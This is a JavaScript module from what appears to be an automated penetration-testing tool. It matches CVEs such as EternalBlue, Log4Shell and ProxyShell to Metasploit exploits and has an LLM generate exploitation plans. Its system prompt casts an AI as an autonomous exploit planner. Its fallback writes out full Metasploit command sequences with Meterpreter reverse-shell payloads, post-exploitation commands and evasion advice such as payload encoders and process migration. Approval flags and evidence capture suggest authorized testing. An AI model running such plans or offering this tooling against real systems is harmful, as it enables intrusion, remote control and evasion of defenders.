import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/exploitation-bridge.ts
async function generateExploitPlan(vulnerability, availableModules, constraints) {
  let exploitDBContext = "";
  try {
    const { findExploitsForVuln, generateExploitDBCLICommands } = await import("./exploitdb-connector-WCBR6NNJ.js");
    const edbResults = await findExploitsForVuln(
      vulnerability.title,
      vulnerability.cve,
      vulnerability.service,
      vulnerability.targetOs
    );
    if (edbResults.candidates.length > 0) {
      const topResults = edbResults.candidates.slice(0, 5);
      exploitDBContext = `

EXPLOITDB SEARCH RESULTS (${edbResults.candidates.length} found):
` + topResults.map((c, i) => {
        const cliCmds = generateExploitDBCLICommands({
          id: c.edbId,
          file: "",
          description: c.title,
          datePublished: c.datePublished,
          author: c.author,
          type: c.type,
          platform: c.platform,
          port: null,
          verified: c.verified,
          codes: c.cves,
          tags: [],
          hasMetasploit: c.hasMetasploit,
          sourceUrl: c.sourceUrl,
          downloadUrl: c.downloadUrl
        });
        return `${i + 1}. EDB-${c.edbId}: ${c.title}
   Platform: ${c.platform} | Verified: ${c.verified} | Has MSF: ${c.hasMetasploit}
   CVEs: ${c.cves.join(", ") || "none"}
   Download: searchsploit -m ${c.edbId}
   URL: ${c.sourceUrl}`;
      }).join("\n");
    }
  } catch (err) {
    console.warn("[ExploitBridge] ExploitDB search failed:", err.message);
  }
  try {
    return await llmGenerateExploitPlan(vulnerability, availableModules, constraints, exploitDBContext);
  } catch (err) {
    console.warn("[ExploitBridge] LLM unavailable, using deterministic fallback:", err.message);
    return deterministicGenerateExploitPlan(vulnerability, constraints);
  }
}
async function llmGenerateExploitPlan(vulnerability, availableModules, constraints, exploitDBContext) {
  const { invokeLLM } = await import("./llm-ZHBF7TZ4.js");
  const knownExploits = CVE_EXPLOIT_PATTERNS[vulnerability.cve];
  const response = await invokeLLM({
    _caller: "exploitation-bridge.llmGenerateExploitPlan",
    _priority: "essential",
    messages: [
      { role: "system", content: EXPLOITATION_SYSTEM_PROMPT },
      {
        role: "user",
        content: `GENERATE EXPLOITATION PLAN:

VULNERABILITY:
- CVE: ${vulnerability.cve}
- Title: ${vulnerability.title}
- CVSS: ${vulnerability.cvss}
- Service: ${vulnerability.service}
- Port: ${vulnerability.port}
- Target IP: ${vulnerability.targetIp}
- Target OS: ${vulnerability.targetOs || "unknown"}

KNOWN EXPLOITS FOR THIS CVE:
${knownExploits ? knownExploits.map((e) => `- ${e.msfModule} (${e.reliability})`).join("\n") : "None in local database \u2014 search Metasploit and ExploitDB"}

AVAILABLE MSF MODULES (if loaded):
${availableModules?.slice(0, 20).join("\n") || "Full Metasploit database available"}
${exploitDBContext || "\nNo ExploitDB results available \u2014 search manually with: searchsploit <keyword>"}

CONSTRAINTS:
- Max OPSEC Risk: ${constraints?.maxOpsecRisk || "no limit"}
- Preferred Payload: ${constraints?.preferPayloadType || "auto-select"}
- LHOST: ${constraints?.lhost || "auto"}
- LPORT: ${constraints?.lport || "auto"}
- Require Approval: ${constraints?.requireApproval !== false}

Generate the full exploitation plan as JSON.`
      }
    ],
    response_format: {
      type: "json_schema",
      json_schema: {
        name: "exploit_plan",
        strict: true,
        schema: {
          type: "object",
          properties: {
            selectedExploitModule: { type: "string" },
            selectedExploitSource: { type: "string", enum: ["metasploit", "exploitdb", "nuclei", "manual"] },
            reliability: { type: "string" },
            alternativeModules: { type: "array", items: { type: "string" } },
            preflightChecks: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  name: { type: "string" },
                  command: { type: "string" },
                  expectedResult: { type: "string" },
                  critical: { type: "boolean" }
                },
                required: ["name", "command", "expectedResult", "critical"],
                additionalProperties: false
              }
            },
            payloadConfig: {
              type: "object",
              properties: {
                type: { type: "string" },
                platform: { type: "string" },
                arch: { type: "string" },
                handler: { type: "string" },
                lhost: { type: "string" },
                lport: { type: "number" },
                encoder: { type: ["string", "null"] },
                notes: { type: "string" }
              },
              required: ["type", "platform", "arch", "handler", "lhost", "lport", "encoder", "notes"],
              additionalProperties: false
            },
            executionSteps: {
              type: "array",
              items: {
                type: "object",
                properties: {
                  order: { type: "number" },
                  action: { type: "string" },
                  command: { type: "string" },
                  description: { type: "string" },
                  expectedOutput: { type: "string" },
                  onFailure: { type: "string" },
                  evidenceCapture: { type: "boolean" },
                  requiresApproval: { type: "boolean" }
                },
                required: ["order", "action", "command", "description", "expectedOutput", "onFailure", "evidenceCapture", "requiresApproval"],
                additionalProperties: false
              }
            },
            evasionRecommendations: { type: "array", items: { type: "string" } },
            exploitChain: {
              type: ["array", "null"],
              items: {
                type: "object",
                properties: {
                  order: { type: "number" },
                  exploitId: { type: "string" },
                  purpose: { type: "string" },
                  prerequisite: { type: "string" },
                  yieldsAccess: { type: "string" }
                },
                required: ["order", "exploitId", "purpose", "prerequisite", "yieldsAccess"],
                additionalProperties: false
              }
            },
            opsecAssessment: {
              type: "object",
              properties: {
                risk: { type: "number" },
                noiseLevel: { type: "string" },
                detectionSignatures: { type: "array", items: { type: "string" } },
                mitigations: { type: "array", items: { type: "string" } }
              },
              required: ["risk", "noiseLevel", "detectionSignatures", "mitigations"],
              additionalProperties: false
            },
            confidence: { type: "number" },
            reasoning: { type: "string" }
          },
          required: ["selectedExploitModule", "selectedExploitSource", "reliability", "alternativeModules", "preflightChecks", "payloadConfig", "executionSteps", "evasionRecommendations", "exploitChain", "opsecAssessment", "confidence", "reasoning"],
          additionalProperties: false
        }
      }
    }
  });
  const parsed = JSON.parse(response.choices[0].message.content);
  const selectedExploit = {
    id: parsed.selectedExploitModule,
    source: parsed.selectedExploitSource,
    modulePath: parsed.selectedExploitModule,
    name: parsed.selectedExploitModule.split("/").pop() || parsed.selectedExploitModule,
    description: parsed.reasoning,
    cves: [vulnerability.cve],
    reliability: parsed.reliability,
    reliabilityScore: RELIABILITY_SCORES[parsed.reliability] || 50,
    targetPlatform: [parsed.payloadConfig.platform],
    targetService: vulnerability.service,
    targetPort: [vulnerability.port],
    exploitType: "remote",
    requiresAuth: false,
    payloadOptions: [parsed.payloadConfig.type],
    opsecRisk: parsed.opsecAssessment.risk,
    evasionDifficulty: 5,
    references: []
  };
  return {
    vulnerability,
    selectedExploit,
    alternativeExploits: parsed.alternativeModules.map((m) => ({
      id: m,
      source: "metasploit",
      modulePath: m,
      name: m.split("/").pop() || m,
      description: "",
      cves: [vulnerability.cve],
      reliability: "normal",
      reliabilityScore: 60,
      targetPlatform: [parsed.payloadConfig.platform],
      targetService: vulnerability.service,
      targetPort: [vulnerability.port],
      exploitType: "remote",
      requiresAuth: false,
      payloadOptions: [],
      opsecRisk: 5,
      evasionDifficulty: 5,
      references: []
    })),
    preflightChecks: parsed.preflightChecks.map((c, i) => ({
      id: `preflight-${i}`,
      ...c,
      description: c.name,
      status: "pending"
    })),
    payloadConfig: { ...parsed.payloadConfig, autoMigrate: true },
    executionSteps: parsed.executionSteps,
    evasionRecommendations: parsed.evasionRecommendations,
    evidenceCapturePlan: {
      preExploitScreenshot: true,
      consoleOutput: true,
      sessionInfo: true,
      postExploitScreenshot: true,
      systemInfo: true,
      networkInfo: true,
      timestampAll: true
    },
    opsecAssessment: parsed.opsecAssessment,
    exploitChain: parsed.exploitChain || void 0,
    confidence: parsed.confidence,
    reasoning: parsed.reasoning
  };
}
function deterministicGenerateExploitPlan(vulnerability, constraints) {
  const knownExploits = CVE_EXPLOIT_PATTERNS[vulnerability.cve];
  const isWindows = vulnerability.targetOs?.toLowerCase().includes("windows");
  const lhost = constraints?.lhost || "0.0.0.0";
  const lport = constraints?.lport || 4444;
  let modulePath = "exploit/multi/handler";
  let reliability = "normal";
  let source = "manual";
  if (knownExploits && knownExploits.length > 0) {
    modulePath = knownExploits[0].msfModule;
    reliability = knownExploits[0].reliability;
    source = "metasploit";
  }
  const payloadType = constraints?.preferPayloadType || (isWindows ? "windows/x64/meterpreter/reverse_https" : "linux/x64/meterpreter/reverse_tcp");
  const selectedExploit = {
    id: modulePath,
    source,
    modulePath,
    name: modulePath.split("/").pop() || modulePath,
    description: `Exploit for ${vulnerability.cve}: ${vulnerability.title}`,
    cves: [vulnerability.cve],
    reliability,
    reliabilityScore: RELIABILITY_SCORES[reliability] || 50,
    targetPlatform: [isWindows ? "windows" : "linux"],
    targetService: vulnerability.service,
    targetPort: [vulnerability.port],
    exploitType: "remote",
    requiresAuth: false,
    payloadOptions: [payloadType],
    opsecRisk: 6,
    evasionDifficulty: 5,
    references: [`https://nvd.nist.gov/vuln/detail/${vulnerability.cve}`]
  };
  return {
    vulnerability,
    selectedExploit,
    alternativeExploits: (knownExploits || []).slice(1).map((e) => ({
      ...selectedExploit,
      id: e.msfModule,
      modulePath: e.msfModule,
      name: e.msfModule.split("/").pop() || e.msfModule,
      reliability: e.reliability,
      reliabilityScore: RELIABILITY_SCORES[e.reliability] || 50
    })),
    preflightChecks: [
      { id: "pf-1", name: "Port reachability", description: "Verify target port is open", command: `naabu -p ${vulnerability.port} -host ${vulnerability.targetIp}`, expectedResult: `${vulnerability.port}/tcp open`, critical: true, status: "pending" },
      { id: "pf-2", name: "Service verification", description: "Verify expected service is running", command: `masscan -pV -p ${vulnerability.port} ${vulnerability.targetIp}`, expectedResult: vulnerability.service, critical: true, status: "pending" },
      { id: "pf-3", name: "Vulnerability check", description: "Verify CVE is exploitable", command: `nuclei -t vuln -p ${vulnerability.port} ${vulnerability.targetIp}`, expectedResult: vulnerability.cve, critical: false, status: "pending" }
    ],
    payloadConfig: {
      type: payloadType,
      platform: isWindows ? "windows" : "linux",
      arch: "x64",
      handler: "exploit/multi/handler",
      lhost,
      lport,
      notes: `Standard ${isWindows ? "Meterpreter HTTPS" : "Meterpreter TCP"} payload for ${vulnerability.service}`
    },
    executionSteps: [
      { order: 1, action: "preflight", command: `naabu -p ${vulnerability.port} -host ${vulnerability.targetIp}`, description: "Run pre-flight checks", expectedOutput: "Port open, service confirmed", onFailure: "Abort \u2014 target not reachable or service changed", evidenceCapture: true, requiresApproval: false },
      { order: 2, action: "setup_handler", command: `use ${selectedExploit.modulePath}
set RHOSTS ${vulnerability.targetIp}
set RPORT ${vulnerability.port}
set PAYLOAD ${payloadType}
set LHOST ${lhost}
set LPORT ${lport}`, description: "Configure exploit and payload in Metasploit", expectedOutput: "Module loaded, options set", onFailure: "Check module availability and options", evidenceCapture: true, requiresApproval: true },
      { order: 3, action: "exploit", command: "exploit -j", description: "Execute the exploit", expectedOutput: "Session opened", onFailure: "Try alternative exploit or adjust payload", evidenceCapture: true, requiresApproval: true },
      { order: 4, action: "verify_access", command: "sessions -l\nsysinfo\ngetuid", description: "Verify shell access and determine privilege level", expectedOutput: "Active session with system info", onFailure: "Session may have died \u2014 re-exploit", evidenceCapture: true, requiresApproval: false },
      { order: 5, action: "capture_evidence", command: "screenshot\nsysinfo\ngetuid\nipconfig\nroute", description: "Capture post-exploitation evidence", expectedOutput: "Evidence artifacts captured", onFailure: "Manual evidence capture required", evidenceCapture: true, requiresApproval: false }
    ],
    evasionRecommendations: [
      "Use staged payload to reduce initial payload size",
      isWindows ? "Consider process migration to a stable process (explorer.exe, svchost.exe)" : "Consider spawning a new process to avoid shell death",
      "Use HTTPS handler for encrypted C2 traffic",
      "Set AutoRunScript for automatic post-exploitation"
    ],
    evidenceCapturePlan: {
      preExploitScreenshot: true,
      consoleOutput: true,
      sessionInfo: true,
      postExploitScreenshot: true,
      systemInfo: true,
      networkInfo: true,
      timestampAll: true
    },
    opsecAssessment: {
      risk: 7,
      noiseLevel: "loud",
      detectionSignatures: ["Exploit traffic on target port", "Reverse shell connection", "New process spawned by service"],
      mitigations: ["Use encrypted payloads", "Migrate process immediately after exploitation", "Clean up exploit artifacts"]
    },
    confidence: knownExploits ? 80 : 40,
    reasoning: knownExploits ? `Known Metasploit module available for ${vulnerability.cve}. Reliability: ${reliability}.` : `No known exploit in local database for ${vulnerability.cve}. Manual exploitation may be required. Search ExploitDB and GitHub for PoC.`
  };
}
function lookupExploitsForCve(cve) {
  return CVE_EXPLOIT_PATTERNS[cve] || [];
}
function getKnownExploitableCves() {
  return Object.keys(CVE_EXPLOIT_PATTERNS);
}
var RELIABILITY_SCORES, CVE_EXPLOIT_PATTERNS, EXPLOITATION_SYSTEM_PROMPT;
var init_exploitation_bridge = __esm({
  "server/lib/exploitation-bridge.ts"() {
    RELIABILITY_SCORES = {
      excellent: 95,
      great: 85,
      good: 75,
      normal: 60,
      average: 50,
      low: 30,
      manual: 10
    };
    CVE_EXPLOIT_PATTERNS = {
      // Exchange ProxyShell/ProxyLogon
      "CVE-2021-34473": [{ msfModule: "exploit/windows/http/exchange_proxyshell_rce", type: "remote", reliability: "excellent" }],
      "CVE-2021-26855": [{ msfModule: "exploit/windows/http/exchange_proxylogon_rce", type: "remote", reliability: "great" }],
      // Log4Shell
      "CVE-2021-44228": [{ msfModule: "exploit/multi/http/log4shell_header_injection", type: "remote", reliability: "good" }],
      // EternalBlue
      "CVE-2017-0144": [{ msfModule: "exploit/windows/smb/ms17_010_eternalblue", type: "remote", reliability: "excellent" }],
      // PrintNightmare
      "CVE-2021-34527": [{ msfModule: "exploit/windows/dcerpc/cve_2021_1675_printnightmare", type: "remote", reliability: "good" }],
      // Apache Struts
      "CVE-2017-5638": [{ msfModule: "exploit/multi/http/struts2_content_type_ognl", type: "remote", reliability: "excellent" }],
      // Spring4Shell
      "CVE-2022-22965": [{ msfModule: "exploit/multi/http/spring_framework_rce_spring4shell", type: "remote", reliability: "good" }],
      // BlueKeep
      "CVE-2019-0708": [{ msfModule: "exploit/windows/rdp/cve_2019_0708_bluekeep_rce", type: "remote", reliability: "normal" }],
      // Zerologon
      "CVE-2020-1472": [{ msfModule: "auxiliary/admin/dcerpc/cve_2020_1472_zerologon", type: "remote", reliability: "great" }],
      // Citrix ADC
      "CVE-2019-19781": [{ msfModule: "exploit/linux/http/citrix_dir_traversal_rce", type: "remote", reliability: "great" }]
    };
    EXPLOITATION_SYSTEM_PROMPT = `You are the AC3 Exploitation Bridge \u2014 an autonomous exploit selection and execution planner.

You match vulnerabilities to exploits, select the optimal attack path, and generate detailed execution plans. Your role is to:
1. Match CVEs to available Metasploit modules, ExploitDB entries, and PoC scripts
2. Rank exploits by reliability, OPSEC risk, and suitability for the target environment
3. Generate pre-flight checks to verify exploitability before attempting
4. Configure payloads with appropriate evasion techniques
5. Plan evidence capture at each stage for the engagement report
6. Identify exploit chains when single exploits are insufficient

EXPLOIT SELECTION PRIORITIES:
1. Reliability first \u2014 prefer "excellent" and "great" ranked modules
2. OPSEC second \u2014 prefer exploits with lower detection signatures
3. Stability \u2014 avoid DoS-prone exploits unless authorized
4. Payload flexibility \u2014 prefer exploits supporting staged/stageless Meterpreter
5. Evidence \u2014 ensure the exploit produces capturable evidence

PAYLOAD GUIDELINES:
- Windows: Prefer windows/x64/meterpreter/reverse_https (encrypted, stable)
- Linux: Prefer linux/x64/meterpreter/reverse_tcp or linux/x64/shell_reverse_tcp
- Web: Prefer cmd/unix/reverse_bash or php/meterpreter/reverse_tcp
- Always use HTTPS handlers when possible for encrypted C2
- Consider AutoMigrate for process migration post-exploitation
- Use encoders (shikata_ga_nai, xor) when AV evasion is needed

OUTPUT FORMAT (JSON):
{
  "selectedExploitModule": string,
  "selectedExploitSource": "metasploit" | "exploitdb" | "nuclei" | "manual",
  "reliability": string,
  "alternativeModules": string[],
  "preflightChecks": [{ "name": string, "command": string, "expectedResult": string, "critical": boolean }],
  "payloadConfig": { "type": string, "platform": string, "arch": string, "handler": string, "lhost": string, "lport": number, "encoder": string | null, "notes": string },
  "executionSteps": [{ "order": number, "action": string, "command": string, "description": string, "expectedOutput": string, "onFailure": string, "evidenceCapture": boolean, "requiresApproval": boolean }],
  "evasionRecommendations": string[],
  "exploitChain": [{ "order": number, "exploitId": string, "purpose": string, "prerequisite": string, "yieldsAccess": string }] | null,
  "opsecAssessment": { "risk": number, "noiseLevel": string, "detectionSignatures": string[], "mitigations": string[] },
  "confidence": number,
  "reasoning": string
}`;
  }
});

export {
  generateExploitPlan,
  deterministicGenerateExploitPlan,
  lookupExploitsForCve,
  getKnownExploitableCves,
  init_exploitation_bridge
};
